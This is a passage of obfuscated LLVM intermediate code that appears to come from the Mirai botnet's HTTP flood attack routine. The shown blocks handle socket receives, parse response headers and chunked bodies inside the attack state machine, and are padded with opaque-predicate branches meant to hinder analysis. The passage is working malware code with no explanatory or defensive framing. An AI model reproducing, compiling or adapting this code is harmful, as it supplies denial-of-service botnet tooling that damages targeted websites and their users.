  %3508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3508, i32 0, i32 18
  %3510 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3509, i32 0, i32 0
  %3511 = getelementptr inbounds i8, i8* %3510, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3507, i8* %3511, i64 960, i32 1, i1 false)
  %3512 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3513 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3512, i32 0, i32 17
  %3514 = load i32, i32* %3513, align 4
  %3515 = sub nsw i32 %3514, 64
  store i32 %3515, i32* %3513, align 4
  br label %3516

; <label>:3516:                                   ; preds = %3504, %3499
  %3517 = call i32* @__errno_location() #7
  store i32 0, i32* %3517, align 4
  %3518 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3518, i32 0, i32 0
  %3520 = load i32, i32* %3519, align 4
  %3521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3521, i32 0, i32 18
  %3523 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3522, i32 0, i32 0
  %3524 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3525 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3524, i32 0, i32 17
  %3526 = load i32, i32* %3525, align 4
  %3527 = sext i32 %3526 to i64
  %3528 = getelementptr inbounds i8, i8* %3523, i64 %3527
  %3529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3529, i32 0, i32 17
  %3531 = load i32, i32* %3530, align 4
  %3532 = sub nsw i32 1024, %3531
  %3533 = sext i32 %3532 to i64
  %3534 = call i64 @recv(i32 %3520, i8* %3528, i64 %3533, i32 16384)
  %3535 = trunc i64 %3534 to i32
  store i32 %3535, i32* %12, align 4
  %3536 = load i32, i32* %12, align 4
  %3537 = icmp eq i32 %3536, 0
  br i1 %3537, label %3538, label %3556

; <label>:3538:                                   ; preds = %3516
  %3539 = load i32, i32* @x.19
  %3540 = load i32, i32* @y.20
  %3541 = sub i32 %3539, 1
  %3542 = mul i32 %3539, %3541
  %3543 = urem i32 %3542, 2
  %3544 = icmp eq i32 %3543, 0
  %3545 = icmp slt i32 %3540, 10
  %3546 = or i1 %3544, %3545
  br i1 %3546, label %originalBB600, label %originalBB600alteredBB

originalBB600:                                    ; preds = %originalBB600alteredBB, %3538
  %3547 = call i32* @__errno_location() #7
  store i32 104, i32* %3547, align 4
  store i32 -1, i32* %12, align 4
  %3548 = load i32, i32* @x.19
  %3549 = load i32, i32* @y.20
  %3550 = sub i32 %3548, 1
  %3551 = mul i32 %3548, %3550
  %3552 = urem i32 %3551, 2
  %3553 = icmp eq i32 %3552, 0
  %3554 = icmp slt i32 %3549, 10
  %3555 = or i1 %3553, %3554
  br i1 %3555, label %originalBBpart2602, label %originalBB600alteredBB

originalBBpart2602:                               ; preds = %originalBB600
  br label %3556

; <label>:3556:                                   ; preds = %originalBBpart2602, %3516
  %3557 = load i32, i32* %12, align 4
  %3558 = icmp eq i32 %3557, -1
  br i1 %3558, label %3559, label %3577

; <label>:3559:                                   ; preds = %3556
  %3560 = call i32* @__errno_location() #7
  %3561 = load i32, i32* %3560, align 4
  %3562 = icmp ne i32 %3561, 11
  br i1 %3562, label %3563, label %3576

; <label>:3563:                                   ; preds = %3559
  %3564 = call i32* @__errno_location() #7
  %3565 = load i32, i32* %3564, align 4
  %3566 = icmp ne i32 %3565, 11
  br i1 %3566, label %3567, label %3576

; <label>:3567:                                   ; preds = %3563
  %3568 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3569 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3568, i32 0, i32 0
  %3570 = load i32, i32* %3569, align 4
  %3571 = call i32 @close(i32 %3570)
  %3572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3572, i32 0, i32 0
  store i32 -1, i32* %3573, align 4
  %3574 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3574, i32 0, i32 1
  store i8 0, i8* %3575, align 4
  br label %3576

; <label>:3576:                                   ; preds = %3567, %3563, %3559
  br label %4027

; <label>:3577:                                   ; preds = %3556
  %3578 = load i32, i32* %12, align 4
  %3579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3579, i32 0, i32 17
  %3581 = load i32, i32* %3580, align 4
  %3582 = add nsw i32 %3581, %3578
  store i32 %3582, i32* %3580, align 4
  %3583 = load i32, i32* %27, align 4
  %3584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3584, i32 0, i32 2
  store i32 %3583, i32* %3585, align 4
  br label %3586

; <label>:3586:                                   ; preds = %originalBBpart2667, %3577
  %3587 = load i32, i32* @x.19
  %3588 = load i32, i32* @y.20
  %3589 = sub i32 %3587, 1
  %3590 = mul i32 %3587, %3589
  %3591 = urem i32 %3590, 2
  %3592 = icmp eq i32 %3591, 0
  %3593 = icmp slt i32 %3588, 10
  %3594 = or i1 %3592, %3593
  br i1 %3594, label %originalBB604, label %originalBB604alteredBB

originalBB604:                                    ; preds = %originalBB604alteredBB, %3586
  store i32 0, i32* %59, align 4
  %3595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3595, i32 0, i32 14
  %3597 = load i32, i32* %3596, align 4
  %3598 = icmp sgt i32 %3597, 0
  %3599 = load i32, i32* @x.19
  %3600 = load i32, i32* @y.20
  %3601 = sub i32 %3599, 1
  %3602 = mul i32 %3599, %3601
  %3603 = urem i32 %3602, 2
  %3604 = icmp eq i32 %3603, 0
  %3605 = icmp slt i32 %3600, 10
  %3606 = or i1 %3604, %3605
  br i1 %3606, label %originalBBpart2606, label %originalBB604alteredBB

originalBBpart2606:                               ; preds = %originalBB604
  br i1 %3598, label %3607, label %3810

; <label>:3607:                                   ; preds = %originalBBpart2606
  %3608 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3609 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3608, i32 0, i32 14
  %3610 = load i32, i32* %3609, align 4
  %3611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3611, i32 0, i32 17
  %3613 = load i32, i32* %3612, align 4
  %3614 = icmp sgt i32 %3610, %3613
  br i1 %3614, label %3615, label %3619

; <label>:3615:                                   ; preds = %3607
  %3616 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3616, i32 0, i32 17
  %3618 = load i32, i32* %3617, align 4
  br label %3623

; <label>:3619:                                   ; preds = %3607
  %3620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3620, i32 0, i32 14
  %3622 = load i32, i32* %3621, align 4
  br label %3623

; <label>:3623:                                   ; preds = %3619, %3615
  %3624 = phi i32 [ %3618, %3615 ], [ %3622, %3619 ]
  store i32 %3624, i32* %59, align 4
  %3625 = load i32, i32* %59, align 4
  %3626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3626, i32 0, i32 14
  %3628 = load i32, i32* %3627, align 4
  %3629 = sub nsw i32 %3628, %3625
  store i32 %3629, i32* %3627, align 4
  %3630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3630, i32 0, i32 11
  %3632 = load i32, i32* %3631, align 4
  %3633 = icmp eq i32 %3632, 1
  br i1 %3633, label %3634, label %3793

; <label>:3634:                                   ; preds = %3623
  %3635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3635, i32 0, i32 18
  %3637 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3636, i32 0, i32 0
  %3638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3638, i32 0, i32 17
  %3640 = load i32, i32* %3639, align 4
  %3641 = call i8* @table_retrieve_val(i32 61, i32* null)
  %3642 = call i32 @util_memsearch(i8* %3637, i32 %3640, i8* %3641, i32 11)
  %3643 = icmp ne i32 %3642, -1
  br i1 %3643, label %3644, label %3792

; <label>:3644:                                   ; preds = %3634
  %3645 = load i32, i32* @x.19
  %3646 = load i32, i32* @y.20
  %3647 = sub i32 %3645, 1
  %3648 = mul i32 %3645, %3647
  %3649 = urem i32 %3648, 2
  %3650 = icmp eq i32 %3649, 0
  %3651 = icmp slt i32 %3646, 10
  %3652 = or i1 %3650, %3651
  br i1 %3652, label %originalBB608, label %originalBB608alteredBB

originalBB608:                                    ; preds = %originalBB608alteredBB, %3644
  %3653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3653, i32 0, i32 18
  %3655 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3654, i32 0, i32 0
  %3656 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3657 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3656, i32 0, i32 17
  %3658 = load i32, i32* %3657, align 4
  %3659 = call i8* @table_retrieve_val(i32 61, i32* null)
  %3660 = call i32 @util_memsearch(i8* %3655, i32 %3658, i8* %3659, i32 11)
  store i32 %3660, i32* %60, align 4
  %3661 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3662 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3661, i32 0, i32 18
  %3663 = load i32, i32* %60, align 4
  %3664 = sext i32 %3663 to i64
  %3665 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3662, i64 0, i64 %3664
  %3666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3666, i32 0, i32 17
  %3668 = load i32, i32* %3667, align 4
  %3669 = load i32, i32* %60, align 4
  %3670 = sub nsw i32 %3668, %3669
  %3671 = call i32 @util_memsearch(i8* %3665, i32 %3670, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3671, i32* %61, align 4
  %3672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3672, i32 0, i32 18
  %3674 = load i32, i32* %60, align 4
  %3675 = load i32, i32* %61, align 4
  %3676 = sub nsw i32 %3675, 1
  %3677 = add nsw i32 %3674, %3676
  %3678 = sext i32 %3677 to i64
  %3679 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3673, i64 0, i64 %3678
  store i8 0, i8* %3679, align 1
  %3680 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3681 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3680, i32 0, i32 15
  %3682 = load i32, i32* %3681, align 4
  %3683 = icmp slt i32 %3682, 5
  %3684 = load i32, i32* @x.19
  %3685 = load i32, i32* @y.20
  %3686 = sub i32 %3684, 1
  %3687 = mul i32 %3684, %3686
  %3688 = urem i32 %3687, 2
  %3689 = icmp eq i32 %3688, 0
  %3690 = icmp slt i32 %3685, 10
  %3691 = or i1 %3689, %3690
  br i1 %3691, label %originalBBpart2630, label %originalBB608alteredBB

originalBBpart2630:                               ; preds = %originalBB608
  br i1 %3683, label %3692, label %3787

; <label>:3692:                                   ; preds = %originalBBpart2630
  %3693 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3694 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3693, i32 0, i32 18
  %3695 = load i32, i32* %60, align 4
  %3696 = sext i32 %3695 to i64
  %3697 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3694, i64 0, i64 %3696
  %3698 = call i32 @util_strlen(i8* %3697)
  %3699 = icmp slt i32 %3698, 128
  br i1 %3699, label %3700, label %3787

; <label>:3700:                                   ; preds = %3692
  %3701 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3702 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3701, i32 0, i32 16
  %3703 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3704 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3703, i32 0, i32 15
  %3705 = load i32, i32* %3704, align 4
  %3706 = sext i32 %3705 to i64
  %3707 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3702, i64 0, i64 %3706
  %3708 = getelementptr inbounds [128 x i8], [128 x i8]* %3707, i32 0, i32 0
  %3709 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3710 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3709, i32 0, i32 18
  %3711 = load i32, i32* %60, align 4
  %3712 = sext i32 %3711 to i64
  %3713 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3710, i64 0, i64 %3712
  %3714 = call i32 @util_strcpy(i8* %3708, i8* %3713)
  %3715 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3716 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3715, i32 0, i32 16
  %3717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3717, i32 0, i32 15
  %3719 = load i32, i32* %3718, align 4
  %3720 = sext i32 %3719 to i64
  %3721 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3716, i64 0, i64 %3720
  %3722 = getelementptr inbounds [128 x i8], [128 x i8]* %3721, i32 0, i32 0
  %3723 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3724 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3723, i32 0, i32 16
  %3725 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3726 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3725, i32 0, i32 15
  %3727 = load i32, i32* %3726, align 4
  %3728 = sext i32 %3727 to i64
  %3729 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3724, i64 0, i64 %3728
  %3730 = getelementptr inbounds [128 x i8], [128 x i8]* %3729, i32 0, i32 0
  %3731 = call i32 @util_strlen(i8* %3730)
  %3732 = sext i32 %3731 to i64
  %3733 = getelementptr inbounds i8, i8* %3722, i64 %3732
  %3734 = call i32 @util_strcpy(i8* %3733, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %3735 = load i32, i32* %61, align 4
  %3736 = add nsw i32 %3735, 3
  %3737 = load i32, i32* %60, align 4
  %3738 = add nsw i32 %3737, %3736
  store i32 %3738, i32* %60, align 4
  %3739 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3740 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3739, i32 0, i32 18
  %3741 = load i32, i32* %60, align 4
  %3742 = sext i32 %3741 to i64
  %3743 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3740, i64 0, i64 %3742
  %3744 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3745 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3744, i32 0, i32 17
  %3746 = load i32, i32* %3745, align 4
  %3747 = load i32, i32* %60, align 4
  %3748 = sub nsw i32 %3746, %3747
  %3749 = call i32 @util_memsearch(i8* %3743, i32 %3748, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3749, i32* %61, align 4
  %3750 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3751 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3750, i32 0, i32 18
  %3752 = load i32, i32* %60, align 4
  %3753 = load i32, i32* %61, align 4
  %3754 = sub nsw i32 %3753, 1
  %3755 = add nsw i32 %3752, %3754
  %3756 = sext i32 %3755 to i64
  %3757 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3751, i64 0, i64 %3756
  store i8 0, i8* %3757, align 1
  %3758 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3758, i32 0, i32 16
  %3760 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3761 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3760, i32 0, i32 15
  %3762 = load i32, i32* %3761, align 4
  %3763 = sext i32 %3762 to i64
  %3764 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3759, i64 0, i64 %3763
  %3765 = getelementptr inbounds [128 x i8], [128 x i8]* %3764, i32 0, i32 0
  %3766 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3767 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3766, i32 0, i32 16
  %3768 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3769 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3768, i32 0, i32 15
  %3770 = load i32, i32* %3769, align 4
  %3771 = sext i32 %3770 to i64
  %3772 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3767, i64 0, i64 %3771
  %3773 = getelementptr inbounds [128 x i8], [128 x i8]* %3772, i32 0, i32 0
  %3774 = call i32 @util_strlen(i8* %3773)
  %3775 = sext i32 %3774 to i64
  %3776 = getelementptr inbounds i8, i8* %3765, i64 %3775
  %3777 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3778 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3777, i32 0, i32 18
  %3779 = load i32, i32* %60, align 4
  %3780 = sext i32 %3779 to i64
  %3781 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3778, i64 0, i64 %3780
  %3782 = call i32 @util_strcpy(i8* %3776, i8* %3781)
  %3783 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3784 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3783, i32 0, i32 15
  %3785 = load i32, i32* %3784, align 4
  %3786 = add nsw i32 %3785, 1
  store i32 %3786, i32* %3784, align 4
  br label %3787

; <label>:3787:                                   ; preds = %3700, %3692, %originalBBpart2630
  %3788 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3788, i32 0, i32 14
  store i32 -1, i32* %3789, align 4
  %3790 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3790, i32 0, i32 1
  store i8 10, i8* %3791, align 4
  br label %4010

; <label>:3792:                                   ; preds = %3634
  br label %3793

; <label>:3793:                                   ; preds = %3792, %3623
  %3794 = load i32, i32* @x.19
  %3795 = load i32, i32* @y.20
  %3796 = sub i32 %3794, 1
  %3797 = mul i32 %3794, %3796
  %3798 = urem i32 %3797, 2
  %3799 = icmp eq i32 %3798, 0
  %3800 = icmp slt i32 %3795, 10
  %3801 = or i1 %3799, %3800
  br i1 %3801, label %originalBB632, label %originalBB632alteredBB

originalBB632:                                    ; preds = %originalBB632alteredBB, %3793
  %3802 = load i32, i32* @x.19
  %3803 = load i32, i32* @y.20
  %3804 = sub i32 %3802, 1
  %3805 = mul i32 %3802, %3804
  %3806 = urem i32 %3805, 2
  %3807 = icmp eq i32 %3806, 0
  %3808 = icmp slt i32 %3803, 10
  %3809 = or i1 %3807, %3808
  br i1 %3809, label %originalBBpart2634, label %originalBB632alteredBB

originalBBpart2634:                               ; preds = %originalBB632
  br label %3810

; <label>:3810:                                   ; preds = %originalBBpart2634, %originalBBpart2606
  %3811 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3812 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3811, i32 0, i32 14
  %3813 = load i32, i32* %3812, align 4
  %3814 = icmp eq i32 %3813, 0
  br i1 %3814, label %3815, label %3957

; <label>:3815:                                   ; preds = %3810
  %3816 = load i32, i32* @x.19
  %3817 = load i32, i32* @y.20
  %3818 = sub i32 %3816, 1
  %3819 = mul i32 %3816, %3818
  %3820 = urem i32 %3819, 2
  %3821 = icmp eq i32 %3820, 0
  %3822 = icmp slt i32 %3817, 10
  %3823 = or i1 %3821, %3822
  br i1 %3823, label %originalBB636, label %originalBB636alteredBB

originalBB636:                                    ; preds = %originalBB636alteredBB, %3815
  %3824 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3824, i32 0, i32 13
  %3826 = load i32, i32* %3825, align 4
  %3827 = icmp eq i32 %3826, 1
  %3828 = load i32, i32* @x.19
  %3829 = load i32, i32* @y.20
  %3830 = sub i32 %3828, 1
  %3831 = mul i32 %3828, %3830
  %3832 = urem i32 %3831, 2
  %3833 = icmp eq i32 %3832, 0
  %3834 = icmp slt i32 %3829, 10
  %3835 = or i1 %3833, %3834
  br i1 %3835, label %originalBBpart2638, label %originalBB636alteredBB

originalBBpart2638:                               ; preds = %originalBB636
  br i1 %3827, label %3836, label %3908

; <label>:3836:                                   ; preds = %originalBBpart2638
  %3837 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3837, i32 0, i32 18
  %3839 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3838, i32 0, i32 0
  %3840 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3841 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3840, i32 0, i32 17
  %3842 = load i32, i32* %3841, align 4
  %3843 = call i32 @util_memsearch(i8* %3839, i32 %3842, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %3844 = icmp ne i32 %3843, -1
  br i1 %3844, label %3845, label %3891

; <label>:3845:                                   ; preds = %3836
  %3846 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3847 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3846, i32 0, i32 18
  %3848 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3847, i32 0, i32 0
  %3849 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3850 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3849, i32 0, i32 17
  %3851 = load i32, i32* %3850, align 4
  %3852 = call i32 @util_memsearch(i8* %3848, i32 %3851, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %3852, i32* %62, align 4
  %3853 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3853, i32 0, i32 18
  %3855 = load i32, i32* %62, align 4
  %3856 = sub nsw i32 %3855, 2
  %3857 = sext i32 %3856 to i64
  %3858 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3854, i64 0, i64 %3857
  store i8 0, i8* %3858, align 1
  %3859 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3860 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3859, i32 0, i32 18
  %3861 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3860, i32 0, i32 0
  %3862 = load i32, i32* %62, align 4
  %3863 = call i32 @util_memsearch(i8* %3861, i32 %3862, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3864 = icmp ne i32 %3863, -1
  br i1 %3864, label %3865, label %3875

; <label>:3865:                                   ; preds = %3845
  %3866 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3867 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3866, i32 0, i32 18
  %3868 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3869 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3868, i32 0, i32 18
  %3870 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3869, i32 0, i32 0
  %3871 = load i32, i32* %62, align 4
  %3872 = call i32 @util_memsearch(i8* %3870, i32 %3871, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3873 = sext i32 %3872 to i64
  %3874 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3867, i64 0, i64 %3873
  store i8 0, i8* %3874, align 1
  br label %3875

; <label>:3875:                                   ; preds = %3865, %3845
  %3876 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3876, i32 0, i32 18
  %3878 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3877, i32 0, i32 0
  %3879 = call i32 @util_atoi(i8* %3878, i32 16)
  store i32 %3879, i32* %63, align 4
  %3880 = load i32, i32* %63, align 4
  %3881 = icmp eq i32 %3880, 0
  br i1 %3881, label %3882, label %3885

; <label>:3882:                                   ; preds = %3875
  %3883 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3884 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3883, i32 0, i32 1
  store i8 1, i8* %3884, align 4
  br label %4010

; <label>:3885:                                   ; preds = %3875
  %3886 = load i32, i32* %63, align 4
  %3887 = add nsw i32 %3886, 2
  %3888 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3889 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3888, i32 0, i32 14
  store i32 %3887, i32* %3889, align 4
  %3890 = load i32, i32* %62, align 4
  store i32 %3890, i32* %59, align 4
  br label %3891

; <label>:3891:                                   ; preds = %3885, %3836
  %3892 = load i32, i32* @x.19
  %3893 = load i32, i32* @y.20
  %3894 = sub i32 %3892, 1
  %3895 = mul i32 %3892, %3894
  %3896 = urem i32 %3895, 2
  %3897 = icmp eq i32 %3896, 0
  %3898 = icmp slt i32 %3893, 10
  %3899 = or i1 %3897, %3898
  br i1 %3899, label %originalBB640, label %originalBB640alteredBB

originalBB640:                                    ; preds = %originalBB640alteredBB, %3891
  %3900 = load i32, i32* @x.19
  %3901 = load i32, i32* @y.20
  %3902 = sub i32 %3900, 1
  %3903 = mul i32 %3900, %3902
  %3904 = urem i32 %3903, 2
  %3905 = icmp eq i32 %3904, 0
  %3906 = icmp slt i32 %3901, 10
  %3907 = or i1 %3905, %3906
  br i1 %3907, label %originalBBpart2642, label %originalBB640alteredBB

originalBBpart2642:                               ; preds = %originalBB640
  br label %3940

; <label>:3908:                                   ; preds = %originalBBpart2638
  %3909 = load i32, i32* @x.19
  %3910 = load i32, i32* @y.20
  %3911 = sub i32 %3909, 1
  %3912 = mul i32 %3909, %3911
  %3913 = urem i32 %3912, 2
  %3914 = icmp eq i32 %3913, 0
  %3915 = icmp slt i32 %3910, 10
  %3916 = or i1 %3914, %3915
  br i1 %3916, label %originalBB644, label %originalBB644alteredBB

originalBB644:                                    ; preds = %originalBB644alteredBB, %3908
  %3917 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3918 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3917, i32 0, i32 17
  %3919 = load i32, i32* %3918, align 4
  %3920 = load i32, i32* %59, align 4
  %3921 = sub nsw i32 %3919, %3920
  %3922 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3923 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3922, i32 0, i32 14
  store i32 %3921, i32* %3923, align 4
  %3924 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3925 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3924, i32 0, i32 14
  %3926 = load i32, i32* %3925, align 4
  %3927 = icmp eq i32 %3926, 0
  %3928 = load i32, i32* @x.19
  %3929 = load i32, i32* @y.20
  %3930 = sub i32 %3928, 1
  %3931 = mul i32 %3928, %3930
  %3932 = urem i32 %3931, 2
  %3933 = icmp eq i32 %3932, 0
  %3934 = icmp slt i32 %3929, 10
  %3935 = or i1 %3933, %3934
  br i1 %3935, label %originalBBpart2659, label %originalBB644alteredBB

originalBBpart2659:                               ; preds = %originalBB644
  br i1 %3927, label %3936, label %3939

; <label>:3936:                                   ; preds = %originalBBpart2659
  %3937 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3937, i32 0, i32 1
  store i8 1, i8* %3938, align 4
  br label %4010

; <label>:3939:                                   ; preds = %originalBBpart2659
  br label %3940

; <label>:3940:                                   ; preds = %3939, %originalBBpart2642
  %3941 = load i32, i32* @x.19
  %3942 = load i32, i32* @y.20
